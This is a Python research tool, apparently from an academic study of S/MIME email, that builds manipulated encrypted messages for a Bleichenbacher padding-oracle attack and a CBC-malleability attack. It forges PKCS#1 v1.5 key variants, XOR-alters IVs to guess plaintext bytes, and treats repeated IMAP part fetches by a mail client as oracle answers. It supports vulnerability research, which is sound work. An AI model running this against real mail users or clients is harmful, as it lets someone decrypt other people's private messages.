#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2023 Fabian Ising; Tobias Kappert
#
# Distributed under terms of the MIT license.

import argparse
import sys
from base64 import b64decode, encodebytes
from binascii import *
from collections import defaultdict

from Cryptodome.Cipher import AES
from asn1crypto import cms
from pkcs1.eme_pkcs1_v15 import decode as pkcs1_decode

from mail_generator import MailGenerator

BOUNDARY = "mixed"
CONTENT_TYPE = "multipart/mixed"

headers = """From: Alice
To: Bob <oracle@example.org>
Subject: {subject}
{extra_headers}
"""

multipart_content_type = "Content-Type: {content_type}; boundary=\"{boundary}\"".format(content_type=CONTENT_TYPE,
                                                                                        boundary=BOUNDARY)
smime_content_type = """Content-Type: application/pkcs7-mime;
	name=smime.p7m;
	smime-type=enveloped-data"""

part_headers = """--mixed
Content-Type: application/pkcs7-mime;
	name=smime.p7m;
	smime-type=enveloped-data
Content-Transfer-Encoding: base64
Mime-Version: 1.0
Content-Disposition: attachment;
	filename=smime.p7m\r\n"""

footer = """--mixed--"""

smime_headers = f"""{smime_content_type}
Content-Transfer-Encoding: base64
Mime-Version: 1.0
Content-Disposition: attachment;
	filename=smime.p7m
""".replace("\n", "\r\n")

template_content = part_headers + """\r\n{content}"""
single_part_template = smime_headers + """\r\n{content}"""

# template_content = "{content}"

bodystructure = """BODYSTRUCTURE ({content} "mixed" ("boundary" "mixed") NIL NIL NIL)"""

structure_part = '("application" "pkcs7-mime" ("name" "smime.p7m" "smime-type" "enveloped-data") NIL NIL "base64" {message_length} NIL ("attachment" ("filename" "smime.p7m")) NIL NIL)'


def int_to_bytes(x: int) -> bytes:
    return x.to_bytes((x.bit_length() + 7) // 8, 'big')


def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)


# https://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks
def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


class EncryptedMailGenerator(MailGenerator):
    def __init__(self, org, key_file):
        super(EncryptedMailGenerator, self).__init__(org, key_file)
        self.query_counts = defaultdict(int)
        self.mails = {}
        self.next = 1
        self.correct_guesses = set()
        self.headers = headers.format(subject="S/MIME Test", extra_headers=smime_headers)

    def setup(self, ciphertext_multiplier=1):
        self.org_cms = cms.ContentInfo.load(self.org)
        cipher_text = bytes(self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        self.org_key = int.from_bytes(bytes(self.org_cms["content"]["recipient_infos"][0].chosen["encrypted_key"]),
                                      'big')
        cipher_new = cipher_text * ciphertext_multiplier
        self.new_cms = self.org_cms.copy()
        self.new_cms["content"]["encrypted_content_info"]["encrypted_content"] = cipher_new

    def get_part_size(self):
        return len((encodebytes(self.new_cms.dump())).strip())

    def get_footer(self):
        return ""

    def create_mail(self, num, enc_key=None):
        self.mails[num] = SinglePartMail(self.new_cms, headers, 0, enc_key)
        self.next += 1
        return self

    def generate_bodystructure(self, num):
        return self.mails[num].generate_bodystructure()

    def get_part(self, num, part):
        self.query_counts[num] += 1
        print(f"{num} requested {self.query_counts[num]} times")
        if self.query_counts[num] > 50:
            self.correct_guesses.add(num)
        return self.mails[num].get_part(part)

    def get_size(self, num):
        return self.mails[num].get_size()

    def get_body(self, num):
        print("get_body")
        body = self.mails[num].get_body()
        return body

    def get_headers(self, num=1):
        return self.headers

    def get_next_unseen(self):
        return self.next


class NLNLGenerator(MailGenerator):
    def __init__(self, org, key_file):
        super(NLNLGenerator, self).__init__(org, key_file)
        self.query_counts = defaultdict(int)
        self.mails = {}
        self.next = 1
        self.correct_guesses = set()
        self.headers = headers.format(subject="S/MIME Multipart", extra_headers=multipart_content_type)
        self.org_cms = self.new_cms = self.org_key = None

    def setup(self, ciphertext_multiplier=1):  # 25000*8 25000*2
        self.org_cms = cms.ContentInfo.load(self.org)
        cipher_text = bytes(self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        self.org_key = int.from_bytes(bytes(self.org_cms["content"]["recipient_infos"][0].chosen["encrypted_key"]),
                                      'big')

        eprint("------- Original Plaintext -------")
        eprint(self.decrypt(self.org_cms))
        eprint("----------------------------")
        iv_new, cipher_new = self.one_block()
        self.new_cms = self.org_cms.copy()

        self.new_cms["content"]["encrypted_content_info"]["encrypted_content"] = cipher_new
        self.new_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"] = iv_new
        eprint("------- New Plaintext-------")
        eprint(self.decrypt(self.new_cms))
        eprint("----------------------------")

    def get_part_size(self):
        return len((encodebytes(self.new_cms.dump())).strip())

    def get_footer(self):
        return footer

    def get_original_key(self):
        return self.org_key

    def manipulate_cms(self, encrypted_key):
        self.new_cms["content"]["recipient_infos"][0] = cms.KeyTransRecipientInfo({
            'version': 'v0',
            'rid': self.new_cms["content"]["recipient_infos"][0].chosen['rid'],
            'key_encryption_algorithm': self.new_cms["content"]["recipient_infos"][0].chosen[
                'key_encryption_algorithm'],
            'encrypted_key': int_to_bytes(encrypted_key)})

        # ALgorithmus geändert!
        # self.new_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"][
        # 'algorithm'] = '1.2.840.113549.3.7'

    def wrong_key(self):
        dec_key = pow(self.org_key, self.dec, self.n)
        dec_key -= 1
        return pow(dec_key, self.enc, self.n)

    def wrong_block_type(self):
        dec_key = pow(self.org_key, self.dec, self.n)
        dec_key = bytearray(int_to_bytes(dec_key))
        dec_key[0] = 0x05
        dec_key = int.from_bytes(dec_key, 'big')
        return pow(dec_key, self.enc, self.n)

    def no_zero(self):
        dec_key = pow(self.org_key, self.dec, self.n)
        dec_key = bytearray(int_to_bytes(dec_key))
        for i, x in enumerate(dec_key):
            if x == 0x00:
                dec_key[i] = 0x01
        dec_key = int.from_bytes(dec_key, 'big')
        return pow(dec_key, self.enc, self.n)

    def change_key_length(self, length=16):
        dec_key = pow(self.org_key, self.dec, self.n)
        dec_key = bytearray(int_to_bytes(dec_key))
        for i, x in enumerate(dec_key):
            if x == 0x00:
                dec_key[i] = 0x01
        dec_key[-(length + 1)] = 0x00
        dec_key = int.from_bytes(dec_key, 'big')
        return pow(dec_key, self.enc, self.n)

    def zero_in_padding(self):
        dec_key = pow(self.org_key, self.dec, self.n)
        dec_key = bytearray(int_to_bytes(dec_key))
        dec_key[4] = 0x00
        dec_key = int.from_bytes(dec_key, 'big')
        return pow(dec_key, self.enc, self.n)

    def vaud(self):
        self.org_cms = cms.ContentInfo.load(self.org)
        cipher_text = bytes(self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        iv = bytes(self.org_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"])
        dec_key = int_to_bytes(pow(self.org_key, self.dec, self.n))
        for i, x in enumerate(dec_key):
            if x == 0:
                dec_key = dec_key[i + 1:]
        aes = AES.new(dec_key, AES.MODE_CBC, iv)
        plain_text = self.decrypt(self.org_cms, output=False)
        plain_new = bytearray(plain_text[:])
        for i in range(len(plain_new)):
            plain_new[i] = 0x41
        plain_new[0] = 0x0a
        plain_new[1] = 0x0a
        aes = AES.new(dec_key, AES.MODE_CBC, iv)
        cipher_new = aes.encrypt(plain_new)
        aes = AES.new(dec_key, AES.MODE_CBC, iv)
        return cipher_new

    def no0x0a0a(self):
        self.org_cms = cms.ContentInfo.load(self.org)
        cipher_text = bytes(self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        iv = bytes(self.org_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"])
        dec_key = int_to_bytes(pow(self.org_key, self.dec, self.n))
        for i, x in enumerate(dec_key):
            if x == 0:
                dec_key = dec_key[i + 1:]
        aes = AES.new(dec_key, AES.MODE_CBC, iv)
        plain_text = self.decrypt(self.org_cms, output=False)
        plain_new = bytearray(plain_text[:])
        for i in range(len(plain_new)):
            plain_new[i] = 0x41
        plain_new[100] = 0x0a
        plain_new[101] = 0x0a
        aes = AES.new(dec_key, AES.MODE_CBC, iv)
        cipher_new = aes.encrypt(plain_new)
        aes = AES.new(dec_key, AES.MODE_CBC, iv)
        return cipher_new

    def ensure0x0a0x0a(self):
        self.org_cms = cms.ContentInfo.load(self.org)
        cipher_text = bytes(self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        iv = bytes(self.org_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"])
        cipher_new = bytes([])
        for i in range(0, 256, 8):
            for j in range(256):
                block = bytes([])
                for k in range(i, i + 8):
                    block += bytes([k, j])
                cipher_new += block + iv
        eprint(len(cipher_new))
        return cipher_new * 10

    def one_block(self, block_index=0, xor=unhexlify("00" * 16)):
        self.org_cms = cms.ContentInfo.load(self.org)
        cipher_text = bytes(self.org_cms["content"]["encrypted_content_info"]["encrypted_content"])
        iv = bytes(self.org_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"])
        cipher_text = iv + cipher_text
        blocks = list(chunks(cipher_text, 16))
        iv = bytearray(blocks[block_index])
        for i in range(len(xor)):
            iv[i] = iv[i] ^ xor[i]
        block = blocks[block_index + 1]
        return bytes(iv), block

    def decrypt(self, cms, output=True):
        cipher_text = bytes(cms["content"]["encrypted_content_info"]["encrypted_content"])
        iv = bytes(cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"])
        enc_key = int.from_bytes(bytes(cms["content"]["recipient_infos"][0].chosen["encrypted_key"]), 'big')
        dec_key = int_to_bytes(pow(enc_key, self.dec, self.n))
        if output: eprint(f"PKCS1v1.5: {hexlify(dec_key).decode()}")
        try:
            if output: eprint(
                f"AES Key (PKCS1): {hexlify(pkcs1_decode(bytes(bytearray(bytes([0x00]) + dec_key)))).decode()}")
        except:
            pass
        key_found = False
        for i, x in enumerate(dec_key):
            if x == 0:
                key_found = True
                dec_key = dec_key[i + 1:]
                break
        if not key_found:
            dec_key = dec_key[-32:]
        if output: eprint(f"len(AES Key): {len(dec_key)}")
        if output: eprint(f"AES Key: {hexlify(dec_key).decode()}")
        try:
            aes = AES.new(dec_key, AES.MODE_CBC, iv)
            plain_text = aes.decrypt(cipher_text)
            # if output: eprint(f"Plain text: {hexlify(plain_text).decode()}")
            if output: eprint("0x0a 0x0a in Plain text: " + str(b'\n\n' in plain_text))
            return plain_text
        except:
            if output: eprint("AES key wrong length")
        return None

    def create_mail(self, num, repeat=50, enc_key=None):
        i = ((num % 128) + 1) ^ 0x0a
        j = ((num // 128) + 1) ^ 0x0a
        print(num, i ^ ord("F"), j ^ ord("r"))
        if num == 100:
            xor = bytes([0x0a ^ ord("F"), 0x0a ^ ord("r")])+ unhexlify("00"*14)
        else:
            xor = bytes([i, j]) + unhexlify("00" * 14)
        iv_new, cipher_new = self.one_block(xor=xor)
        self.new_cms = self.org_cms.copy()

        self.new_cms["content"]["encrypted_content_info"]["encrypted_content"] = cipher_new
        self.new_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"]["parameters"] = iv_new

        # self.new_cms = self.org_cms.copy()
        self.mails[num] = Mail(self.new_cms, self.headers, repeat, enc_key)
        self.next += 1
        return self
        # for j in range(repeat_orig):
        # yield template_content.format(content=org_content)
        # yield template_content.format(content=encodebytes(self.new_cms.dump()).decode("ascii"))
        # for j in [2]: # 11 is arbitrary
        # for _ in range(repeat_each):

        # eprint("------- New AES Key --------")
        # self.decrypt(self.new_cms)
        # eprint("----------------------------")

        # new_cms["content"]["encrypted_content_info"]["content_encryption_algorithm"] = cms.EncryptionAlgorithm({"algorithm": '1.2.840.113549.3.4'})
        # yield template_content.format(content=new_content)
        # while True:
        # yield template_content.format(content=encodebytes(self.org_cms.dump()).decode("ascii"))

    def generate_bodystructure(self, num):
        return self.mails[num].generate_bodystructure()

    def get_part(self, num, part):
        self.query_counts[num] += 1
        if self.query_counts[num] > 10:
            print(f"{num} requested {self.query_counts[num]} times")
        if self.query_counts[num] > 20:
            self.correct_guesses.add(num)
        return self.mails[num].get_part(part)

    def get_size(self, num):
        return self.mails[num].get_size()

    def get_body(self, num):
        return self.mails[num].get_body()

    def get_headers(self, num=1):
        return self.mails[num].headers

    def get_next_unseen(self):
        return self.next

    def generate_mail(self, repeat=10):
        vector_list = []
        for j in range(repeat):
            vector_list.append(encodebytes(self.new_cms.dump()).decode("ascii"))

        return vector_list


class Mail:
    def __init__(self, cms, headers, num_parts, enc_key=None):
        if enc_key is not None:
            self.manipulate_cms(enc_key)
        self.content = encodebytes(cms.dump()).decode("ascii")
        self.num_parts = num_parts
        self.headers = headers
        self.body = None  # Lazy

    def generate_bodystructure(self):
        all_parts = []
        size = self.get_part_size(1)
        for i in range(0, self.num_parts):
            all_parts.append(structure_part.format(message_length=size))
        return bodystructure.format(content=''.join(all_parts))

    def get_part(self, part):
        return self.content

    def get_part_size(self, part):
        return len(self.content)

    def get_size(self):
        # TODO
        size = self.get_part_size(1) * self.num_parts + len(self.headers) + len(part_headers) * self.num_parts
        return size

    def get_body(self):
        if self.body is None:
            all_parts = []
            for part_num in range(1, self.num_parts + 1):
                all_parts.append(template_content.format(content=self.get_part(part_num)))
            self.body = self.headers + "\r\n".join(all_parts)
        return self.body


class SinglePartMail:
    def __init__(self, cms, headers, num_parts, enc_key=None):
        self.content = encodebytes(cms.dump()).decode("ascii")
        self.num_parts = num_parts
        self.headers = headers
        self.body = None  # Lazy

    def generate_bodystructure(self):
        return structure_part.format(message_length=self.get_part_size(1))

    def get_part(self, part):
        return self.content

    def get_part_size(self, part):
        return len(self.content)

    def get_size(self):
        # TODO
        size = self.get_part_size(1) * self.num_parts + len(self.headers) + len(part_headers) * self.num_parts
        return size

    def get_body(self):
        self.body = self.get_part(1)
        return self.body


def parse_args():
    parser = argparse.ArgumentParser("Create Bleichenbacher E-Mail.")
    parser.add_argument("file", metavar='eml_file', type=str, help="Path to the eml file.")
    parser.add_argument("--key-file", metavar='key_file', type=str, help="Path to the pem file.", default=None)
    return parser.parse_args()


def main():
    args = parse_args()
    org = b64decode(open(args.file).read())
    generator = EncryptedMailGenerator(org, args.key_file)
    generator.setup(1)
    generator.create_mail(1)
    print(generator.get_headers(1))
    print(generator.get_body(1))
    print(generator.get_footer())


if __name__ == "__main__":
    main()
